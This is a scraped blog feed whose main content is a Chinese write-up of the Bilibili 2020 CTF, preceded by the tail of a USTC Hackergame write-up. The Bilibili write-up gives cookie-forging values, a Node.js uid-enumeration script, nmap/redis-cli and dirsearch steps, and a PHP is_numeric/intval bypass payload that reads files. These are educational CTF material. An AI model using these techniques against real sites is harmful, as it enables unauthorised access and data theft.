src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/8.png\" width=\"750\" height=\"400\" class=\"lazy post-img\"></p>\n<p>「我们已经向您 <strong>推送（PUSH）</strong> 了最新的 <strong>Secret</strong> ，但是你可能无法直接看到它」。现在我们知道了，这道题和 HTTP/2 Server Push 有关。解码 HTTP/2 帧最好的方法自然是使用 Wireshark。首先我们要让 Wireshark 能够解密 HTTPS 内容，最简单的方法是使用 <code>SSLKEYLOGFILE</code> 环境变量。</p>\n<blockquote><p>警告！使用 <code>SSLKEYLOGFILE</code> 环境变量非常危险，任何获取该变量的软件都可以随意解密你的 HTTPS 流量！因此，务必仅针对某一需要解密流量的软件、在某一次性 Session 下设置该环境变量！</p></blockquote>\n<p>打开 Chrome，在 <code>chrome://version/</code> 中查看可执行文件路径：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/10.png\" width=\"1196\" height=\"270\" class=\"lazy post-img\"></p>\n<p>然后在终端中通过预设环境变量直接启动 Chrome：</p>\n<pre><code class=\"hljs bash\">SSLKEYLOGFILE=<span class=\"hljs-string\">\"/path/to/ssllog.txt\"</span> <span class=\"hljs-string\">\"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\"</span></code></pre>\n<p>启动 Wireshark 偏好设置中找到 Protocol - TLS、配置 (Pre)-Master-Secret log filename：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/11.png\" width=\"687\" height=\"514\" class=\"lazy post-img\"></p>\n<p>现在，再通过启动的 Chrome 访问「Smart Proxy!」，可以看到 Wireshark 完整解密了 Chrome 的所有 HTTPS 流量。在 Wireshark 中使用下述过滤器找出本题的流量：</p>\n<pre><code class=\"hljs plaintext\">ip.addr == 146.56.228.227</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/12.png\" width=\"1371\" height=\"279\" class=\"lazy post-img\"></p>\n<p>在过滤后的流量中我们很快就可以找到 PUSH_PROMISE 帧、告诉了我们如何获得 secret 和第一个 flag：<code>GET /ebe087a0-68e5-4280-b605-b98b89488e1e</code>。</p>\n<p>获得第一个 flag 后，我们可以在终端中 Ctrl + C 关闭 Chrome。之后从 Dock、桌面、Finder、Spotlight 等方法「正常启动」Chrome 是不会再将 TLS 握手的信息输出到 SSLKEYLOGFILE 的。</p>\n<h2>尾声</h2>\n<p>今年的 USTC Hackergame 对我来说运气的成分远高于能力的成分，不少题目都是侥幸做出来的，而且对 <code>binary</code> 和 <code>math</code> 一窍不通的我这两类题几乎一道题都没做出来；比赛期间甚至收到了主办方邀请提交「非官方题解」，受宠若惊（狐狐暗自高兴）；最后拿到了 3250 分，排名侥幸挤进了前 50、与真正的 CS 大佬和 CTF 师傅们在榜上合影，瑟瑟发抖（非常害怕）。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.9/31.png\" width=\"1109\" height=\"135\" class=\"lazy post-img\"></p>\n<p>没有对比就没有伤害，相比 <a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">两周前 Bilibili 的「1024  程序员节 CTF」</a>，USTC Hackergame 不论是在难度梯度分布、题目水平、趣味性、活动整体质量上都远高一个层次。引用组委会成员「Zihan Zheng」在知乎「<a href=\"https://www.zhihu.com/question/351947330/answer/866177844\">参加中国科学技术大学第六届信息安全大赛（Hackergame 2019）是怎样一种体验？</a>」提问中的回答：</p>\n<blockquote><p>我们举办的 Hackergame 的初衷就是对新人友好，增加趣味性，强调教育意义。我看到有些同学反馈说题目偏简单、逆向题偏少等等，我想强调，我们这个比赛虽然是提交 flag 的形式，但<strong>不是 CTF 比赛，不会与国内外的 CTF 比赛对标</strong>。我们会把这个特色坚持下去，希望大家不要从经验丰富的 CTF 选手视角来评价我们的比赛。</p></blockquote>\n<p>如果说 Hackergame 的初衷是「对新人友好，增加趣味性，强调教育意义」，IMHO 不论是 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">往届</a> 还是今年的比赛都完美达成了这一点；毫无疑问地，明年的比赛我依然会参加。最后当然是要在「尾声」中喊一句口号：</p>\n<blockquote><p>「我有一个绝妙的解法，可惜我号太少，说不出来」</p></blockquote>\n<div class=\"license\"> <div class=\"license-title\">USTC Hackergame 2020（中科大信安赛）write up</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hackergame-2020-write-up/\">https://blog.skk.moe/post/hackergame-2020-write-up/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-11-06</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hackergame-2020-write-up/"},{"title":"Bilibili 2020「1024 程序员节」CTF Write Up","date":"2020-10-25 09:44:00","description":"\n<blockquote><p>周六不放假休息，还在这加班搞 CTF？</p></blockquote>\n<p>10 月 24 日不睡觉、凌晨两点钟我还在水群，结果在 USTC@LUG 的群里看见有人在打 Bilibili 的 CTF。我刚刚好一年（指 370 天）没有打过 CTF 了（上一次打正式的 CTF 还是去年参加的 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">USTC Hackergame 2019</a>），所以想着来玩玩。虽然 CTF 结束之前不应该分享和公开 Write Up 和题解，不过 Bilibili 这 CTF 既然这么离谱，那我也没必要按照常理出牌。</p>\n<span></span><blockquote><p>本文更新于 2020 年 10 月 25 日下午 6 点（China Standard Time）。</p></blockquote>\n<p>由于这次 Bilibili 的 CTF 题实在没有什么存档研究的必要，我的 Write Up 里就留一些代码片段和截图，大家也没有复盘的必要。</p>\n<h2>页面的背后是什么 &amp; 真正的秘密只有特殊的设备才能看到</h2>\n<p>一个页面，两道题。打开来就是这个页面：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/1.png\" width=\"1901\" height=\"720\" class=\"lazy post-img\"></p>\n<p>curl 太慢了而且没有代码高亮、直接在地址栏通过 <code>view-source:</code> 看看源码，把 JavaScript 拿出来：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/admin\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            <span class=\"hljs-keyword\">var</span> input = <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"flag1\"</span>);            input.value = <span class=\"hljs-built_in\">String</span>(data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag1'</span>).html(<span class=\"hljs-string\">\"接口异常，请稍后再试～\"</span>);        }    }})</code></pre>\n<p>所以第一题的 Flag 就是 <code>GET /api/admin</code> 了。在页面上 <code>#flag1</code> 元素是被包裹在一个 <code>display: none</code> 的容器里的，不过审查元素或者直接请求访问 API 都能拿到第一题的 Flag。</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/2\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"flag2: \"</span> + data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"需要使用bilibili Security Browser浏览器访问～\"</span>);        }    }})</code></pre>\n<p>第二题要求用「bilibili Security Browser」访问，有没有让你想起来前年 USTC Hackergame 2018 的「黑曜石浏览器」？</p>\n<p>直接用 <code>bilibili Security Browser</code> 作为 User-Agent 请求 API 即可获得 Flag，注意别忘了带上 <code>Session</code> 这个 Cookie，这个是 Bilibili 账户登录状态。</p>\n<blockquote>\n<p>Chromium Based 浏览器本身内置了修改了 User-Agent 的功能。打开 DevTools 的设置菜单、在「Devices」里添加一个新的设备，此处可以指定 User-Agent：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/2.png\" width=\"830\" height=\"301\" class=\"lazy post-img\"></p>\n<p>之后就可以使用「bilibili Security Browser」访问了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/3.png\" width=\"751\" height=\"666\" class=\"lazy post-img\"></p>\n</blockquote>\n<h2>密码是啥？</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/4.png\" width=\"1905\" height=\"853\" class=\"lazy post-img\"></p>\n<p>这道题没啥好 Write Up 的，全部靠猜。用户名是 <code>admin</code> 密码是 <code>bilibili</code>。</p>\n<blockquote><p>你这算哪门子 CTF 啊？又不靠社工，真就硬猜？</p></blockquote>\n<p>以及，你给我翻译翻译，什么叫做 falg？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/5.png\" width=\"431\" height=\"731\" class=\"lazy post-img\"></p>\n<h2>对不起，权限不足～</h2>\n<p>首次访问：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/6.png\" width=\"1899\" height=\"543\" class=\"lazy post-img\"></p>\n<p>刷新一次：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/7.png\" width=\"1901\" height=\"538\" class=\"lazy post-img\"></p>\n<p>有趣，看一下源代码：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/4\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-built_in\">console</span>.log(data);        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～答案是 : {{ \"</span> + data.data + <span class=\"hljs-string\">\" }}\"</span>.toLowerCase() )        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"有些秘密只有超级管理员才能看见哦~\"</span>)        }    }})</code></pre>\n<p>又是 API 返回 flag，用手指头想都知道鉴权是 Cookie 做的，打开 F12 查看 Cookie：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/8.png\" width=\"646\" height=\"46\" class=\"lazy post-img\"></p>\n<p>两个 Cookie，一个是 <code>session</code>，是 Bilibili 账户登录状态的 cookie；另一个是 <code>role</code>，毫无疑问就是我们下手的对象：</p>\n<pre><code class=\"hljs plaintext\">role=ee11cbb19052e40b07aac0ca060c23ee</code></pre>\n<p>打 CTF 的人应该早就把这一串刻进 DNA 里了。即使不知道这串字符是什么东西，丢进搜索引擎后也会知道这是 <code>user</code> 的 MD5。接下来思路就很清晰了，通过将 <code>role</code> 的 Cookie 改成另一串 MD5 即可。</p>\n<p>不过这就是这道题离谱的地方了，这道题要把 <code>role</code> 改成 <code>Administrator</code> 的 MD5（你没有看错，首字母是大写的）：</p>\n<pre><code class=\"hljs plaintext\">role=7b7bc2512ee1fedcd76bdc68926d4f7b</code></pre>\n<p>改好 Cookie 刷新页面就可以拿到 flag 了。</p>\n<h2>别人的秘密</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/9.png\" width=\"1897\" height=\"512\" class=\"lazy post-img\"></p>\n<pre><code class=\"hljs js\">$(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{    (<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">$</span>) </span>{        $.getUrlParam = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">name</span>) </span>{            <span class=\"hljs-keyword\">var</span> reg = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">RegExp</span>(<span class=\"hljs-string\">\"(^|&amp;)\"</span> + name + <span class=\"hljs-string\">\"=([^&amp;]*)(&amp;|$)\"</span>);            <span class=\"hljs-keyword\">var</span> r = <span class=\"hljs-built_in\">window</span>.location.search.substr(<span class=\"hljs-number\">1</span>).match(reg);            <span class=\"hljs-keyword\">if</span> (r != <span class=\"hljs-literal\">null</span>) <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">unescape</span>(r[<span class=\"hljs-number\">2</span>]); <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">null</span>;        }    })(jQuery);    <span class=\"hljs-keyword\">var</span> uid = $.getUrlParam(<span class=\"hljs-string\">'uid'</span>);    <span class=\"hljs-keyword\">if</span> (uid == <span class=\"hljs-literal\">null</span>) {        uid = <span class=\"hljs-number\">100336889</span>;    }    $.ajax({        <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/5?uid=\"</span> + uid,        <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,        <span class=\"hljs-attr\">success</span>: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{            <span class=\"hljs-built_in\">console</span>.log(data);            <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>) {                <span class=\"hljs-comment\">// 如果有值：前端跳转</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～flag : \"</span> + data.data)            } <span class=\"hljs-keyword\">else</span> {                <span class=\"hljs-comment\">// 如果没值</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"这里没有你想要的答案～\"</span>)            }        }    })});</code></pre>\n<p>这道题更离谱，上来先在 jQuery 的 <code>$</code> 对象下挂了一个 <code>getUrlParam</code> 方法用来获取 uid、然后还有一个当 uid 不存在时给予默认值的方法（默认值取 <code>100336889</code>），接下来就是 <code>GET /api/ctf/5?uid=${uid}</code>。</p>\n<blockquote><p>千万不要学习本题源码中的方法解析 URL 参数！<code>unescape</code> 不能处理非 ASCII 字符，极易产生乱码，在生产环境中只应使用 WHATWG URL API 的 <code>searchParams</code> ！</p></blockquote>\n<p>这道题没什么好说的，直接遍历就好了，Node.js 解法如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> http = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'http'</span>);<span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">get</span>(<span class=\"hljs-params\">hostname, path</span>) </span>{  <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Promise</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve, reject</span>) =&gt;</span> {    <span class=\"hljs-keyword\">const</span> req = http.request(      { hostname, path, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> },      <span class=\"hljs-function\">(<span class=\"hljs-params\">res</span>) =&gt;</span> {        <span class=\"hljs-keyword\">const</span> body = [];        res.on(<span class=\"hljs-string\">'data'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">chunk</span>) =&gt;</span> { body.push(chunk); });        res.on(<span class=\"hljs-string\">'end'</span>, <span class=\"hljs-function\">() =&gt;</span> {          <span class=\"hljs-keyword\">try</span> {            resolve(Buffer.concat(body).toString());          } <span class=\"hljs-keyword\">catch</span> (e) {            reject(e);          }        });        req.on(<span class=\"hljs-string\">'error'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">err</span>) =&gt;</span> { reject(err); });      }    );    req.setHeader(<span class=\"hljs-string\">'Cookie'</span>, <span class=\"hljs-string\">'session=你的 Session'</span>)    req.end();  });}(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> ip = <span class=\"hljs-string\">'45.113.201.36'</span>; <span class=\"hljs-comment\">// 我也不知道靶机的 IP 为什么会变，可能被打死了</span>  <span class=\"hljs-keyword\">let</span> uid = <span class=\"hljs-number\">100336889</span>;  <span class=\"hljs-keyword\">while</span> (<span class=\"hljs-literal\">true</span>) {    <span class=\"hljs-keyword\">const</span> res = <span class=\"hljs-keyword\">await</span> get(ip, <span class=\"hljs-string\">`/api/ctf/5?uid=<span class=\"hljs-subst\">${uid++}</span>`</span>);    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-built_in\">JSON</span>.parse(res).code === <span class=\"hljs-number\">200</span>) {      <span class=\"hljs-built_in\">console</span>.log(uid, res);      <span class=\"hljs-keyword\">break</span>;    }  }})();</code></pre>\n<p>唯一值得说的是，如果从他给的 UID 默认值（<code>100336889</code>）开始往上刷，很快就刷到了（<code>100336952</code>）。</p>\n<blockquote><p>这我们怎么知道嘛？我反正一开始是从 0 开始刷的，好在我做这道题时是 10 月 24 日凌晨三点、只有几个人在玩，靶机还扛得住，1 亿我真就刷出来了。</p></blockquote>\n<h2>结束亦是开始</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/10.png\" width=\"1443\" height=\"870\" class=\"lazy post-img\"></p>\n<p>一个页面，文章标题、内容、分类、标签全部都是 null；评论框是用 HTML5 表单做的、什么都不能提交；URL 的格式是 <code>/blog/single.php?id=1</code>。</p>\n<p>这道题和 CUIT（成都信息科技大学）有一年 CTF 校内赛的渗透题很类似。那道题也是 <code>single.php?id=1</code>，SQL 提权然后 Get shell 打入内网。所以一开始看到这个 URL 就开始盲猜是 SQL 注入。我当时做到这道题时已经五点了，所以挂上 sqlmap 就去睡觉了，结果并没有做出来这道题（sqlmap 毫无头猪，不过给了疑似存在 Referer 时间戳盲注）。</p>\n<blockquote><p>等做出来第十题后再来看这道题，就觉得非常离谱；到后来做出来的大佬提示大家这是一道脑洞题时，我已经没有心思做下去了。</p></blockquote>\n<p>从第六题开始，所有题目都说「接下来的旅程，需要少年自己去探索啦～」，也就是说接下来所有的题目都是 Web 盲题。</p>\n<h2>第八题</h2>\n<p>这道题要靠 nmap 扫端口扫出来，发现 6379 端口开放，当然就是大家最爱的未设防的 Redis 服务器啦。</p>\n<p>直接通过 redis-cli 连接靶机，一把梭拿到 flag：</p>\n<pre><code class=\"hljs plaintext\">$ redis-cli -h [靶机 IP] -p 637945.113.201.36:6379&gt; keysflag845.113.201.36:6379&gt; get flag8</code></pre>\n<p>值得注意的是，这 Redis Server 很有趣，因为你使用任何其它命令都只会返回 OK：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/11.png\" width=\"406\" height=\"168\" class=\"lazy post-img\"></p>\n<p>所以，这个很可能是个假的 Redis Server、就是个 REPL，<del>也许第九题就是道 pwn 题呢？</del></p>\n<h2>第十题</h2>\n<p>第十题的入口要靠目录爆破，我使用的工具是 <a href=\"https://github.com/maurosoria/dirsearch\">dirsearch</a>：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/12.png\" width=\"833\" height=\"573\" class=\"lazy post-img\"></p>\n<p>直接访问 <code>/test.php</code> 是个 JSFuck，所以直接丢进 Console 就好了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/13.png\" width=\"689\" height=\"145\" class=\"lazy post-img\"></p>\n<blockquote><p>程序员最多的地方 bilibili1024havefun</p></blockquote>\n<p>程序员最多的地方当然是 GitHub 了。去 GitHub 上搜索 <code>bilibili1024havefun</code> 很容易就可以找到这个仓库 <a href=\"https://github.com/interesting-1024/end\">interesting-1024/end</a>：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><span class=\"hljs-comment\">//filename end.php</span><span class=\"hljs-variable\">$bilibili</span> = <span class=\"hljs-string\">\"bilibili1024havefun\"</span>;<span class=\"hljs-variable\">$str</span> = intval(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-variable\">$reg</span> = preg_match(<span class=\"hljs-string\">'/\\d/is'</span>, <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-keyword\">if</span>(!is_numeric(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]) <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$reg</span> !== <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$str</span> === <span class=\"hljs-number\">1</span>){    <span class=\"hljs-variable\">$content</span> = file_get_contents(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'url'</span>]);    <span class=\"hljs-comment\">//文件路径猜解</span>    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-literal\">false</span>){        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"还差一点点啦～\"</span>;    }<span class=\"hljs-keyword\">else</span>{        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$flag</span>;    }}<span class=\"hljs-keyword\">else</span>{    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"你想要的不在这儿～\"</span>;}<span class=\"hljs-meta\">?&gt;</span></code></pre>\n<p>所以这道题就是在 <code>/blog/end.php</code> 里了，构建 Payload 以获取 Flag。这道题考察的是 <code>is_numeric</code> 和 <code>intval</code> 如何绕过、以及 <code>$_GET</code> 的一些脑洞。这道题最终的 Payload 是：</p>\n<pre><code class=\"hljs plaintext\">/blog/end.php?id[]=x&amp;id[]=0.1&amp;url=./flag.txt</code></pre>\n<blockquote><p><code>url</code> 参数只要包含 <code>flag.txt</code> 即可，所以你就算 <code>url=114514flag.txt1919810</code> 都是可以的。和某些人说的 <code>/api/ctf/10/flag.txt</code>、<code>/api/ctf/6/flag.txt</code> 完全没有关系。</p></blockquote>\n<p>这道题最简洁的思路是利用 <code>$_GET</code> 支持返回数组 ：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>print_r(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'tag_name'</span>]);<span class=\"hljs-comment\">// http://127.0.0.1/index.php?tag_name[]=苏卡卡&amp;tag_name[]=大尾巴狐狸</span><span class=\"hljs-comment\">// Array ( [0] =&gt; 苏卡卡 [1] =&gt; 大尾巴狐狸 )</span></code></pre>\n<p>关于如何 Bypass <code>is_numeric</code>、<code>intval</code>，我找到了一篇写的还挺全面的文章「<a href=\"https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/\">CTF 中常见 PHP 特性学习笔记</a>」。</p>\n<blockquote><p>顺便，不少战队和选手通过 <code>$file_get_contents</code> 逃逸后，把每道题的源码都读了一遍、甚至通过读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 拖死了靶机，不过这已经是后话了。</p></blockquote>\n<h2>尾声</h2>\n<p>USTC Hackergame 2018 为了「黑曜石浏览器」的题专门上线了一个官网、在那个官网的源码中隐藏了 Heicore Browser 的 User-Agent，Bilibili 的第二题是一个非常拙劣的模仿；第三题直接就是脑筋急转弯，和渗透、社工毫无关联，密码纯粹靠猜；第四题更是表现了出题人的前端知识基本为 0，使用从 CSDN 上抄来的 URL 参数解析代码，却不知道 JavaScript 中 <code>unescape</code> 不能处理非 ASCII 字符（更不必说 <code>unescape</code> 是一个已被弃用的方法），基本上是个前端都知道宁肯引入 <code>URL.searchParams</code> 的 Polyfill 也不应该自己解析 URL；第五题并没有明确提示告诉大家应该从给定的默认 uid 开始刷（你给我翻译翻译，谁家系统的超级管理员 uid 不是小于 10 而是大于 1 亿的？）。在经过了这么多无厘头的题目以后，接下来上来就是五道 Web 盲题：未设防 Redis 题本来可以深入到 Get shell、提权的，结果第八题草草 <code>get flag8</code> 了事；第十题的「文件路径猜解」更是非常无厘头，当做题人构建完能绕过 <code>is_numeric</code> 和 <code>intval</code>  的 Payload 后，还要猜测 <code>url</code> 参数的取值需要包含 <code>flag.txt</code> 才能取到最终的 flag；而且第十题拿到的图片直接 <code>tail</code> 就能拿到 flag，而图片隐写本来是非常经典的 CTF 考法。</p>\n<p>无厘头的题目、加上混乱的活动页面（Vue 和 jQuery 齐飞、Element UI 共 Bootstrap 一色），再联想起 Bilibili 中间件源码泄漏、Anankke 在新年活动上 <a href=\"https://blog.anank.ke/w/pilipili_cheers\">只用两小时就刷出了 11 亿美食值</a>，我们大体上可以猜测的出 Bilibili 内部混乱的管理、松散的组织，和极度不重视信息安全、乃至极度不重视技术的风气。Bilibili 这一次的 CTF 暴露出来的问题，远不止选手用 <code>/blog/end.php</code> 读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 耗尽靶机性能导致题目 404 这么简单了。</p>\n<div class=\"license\"> <div class=\"license-title\">Bilibili 2020「1024 程序员节」CTF Write Up</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-25</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/"},{"title":"从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性","date":"2020-10-13 09:25:00","description":"\n<p>之前我在「<a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">天下武功，唯快不破 —— 我是这样优化博客的</a>」一文中提到「对于大部分浏览器来说，确保 JS 异步加载和执行的做法其实是在操作 DOM 动态插入 <code>&lt;script async&gt;</code>」，但是并没有给出详细原因。这一次我以 Google Analytics 的统计代码为引子，详细讲讲 <code>&lt;script&gt;</code> 的 <code>async</code> 和 <code>defer</code> 属性、以及它们背后的故事。</p>\n<h2>拆开 Google Analytic 的统计代码</h2>\n<p>现在 Google 推出了 Google Tag Manager，通过 <code>window.gtag</code> 可以轻易加载包括 <code>analytics.js</code>、Google AD、Google OAuth 等 Google 插件：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Global site tag (gtag.js) - Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"https://www.googletagmanager.com/gtag/js?id=UA-122669675-1\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-built_in\">window</span>.dataLayer = <span class=\"hljs-built_in\">window</span>.dataLayer || [];</span><span class=\"javascript\">  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">gtag</span>(<span class=\"hljs-params\"></span>)</span>{dataLayer.push(<span class=\"hljs-built_in\">arguments</span>);}</span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'js'</span>, <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>());</span><span class=\"javascript\"></span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'config'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>在 Google Tag Manager 出现之前，大部分人更熟悉传统的 <code>analytics.js</code> 统计代码：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">i,s,o,g,r,a,m</span>)</span>{i[<span 